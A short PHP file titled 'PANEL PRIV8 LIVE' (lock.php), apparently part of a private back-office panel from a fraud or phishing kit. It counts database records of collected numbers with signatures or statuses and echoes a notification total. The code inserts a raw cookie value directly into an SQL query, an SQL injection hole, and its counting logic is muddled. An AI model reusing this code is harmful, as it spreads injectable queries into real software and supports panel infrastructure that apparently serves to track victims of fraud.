<?php
/**
* PANEL PRIV8 LIVE
* @package    lock.php
* @author     https://t.me/neo_net
* @copyright  2021
* @version    2.0
* Info :  PHP comment
*/
session_start();
include '../database/db.php';
//include '../defense/ajax.php';
$hash = @$_COOKIE['identificator'];
$fhrji = $connection->query("SELECT hash FROM secure where hash='$hash'");
if (!isset($_SESSION['userSession']) && mysqli_num_rows($fhrji) === 0) {
//Nothing to do boy
}
else {
$notification2 = $connection->query("SELECT * FROM numeros where firma IS NOT NULL");
$notification = $connection->query("SELECT * FROM numeros where status IS NOT NULL");



if (mysqli_num_rows($notification2) == '') {
$om = 0;
}

else {
$om = mysqli_num_rows($notification2);
}


if(mysqli_num_rows($notification) == ''){
echo 0+$om;
}

else{
echo mysqli_num_rows($notification2)+$om;
	}



}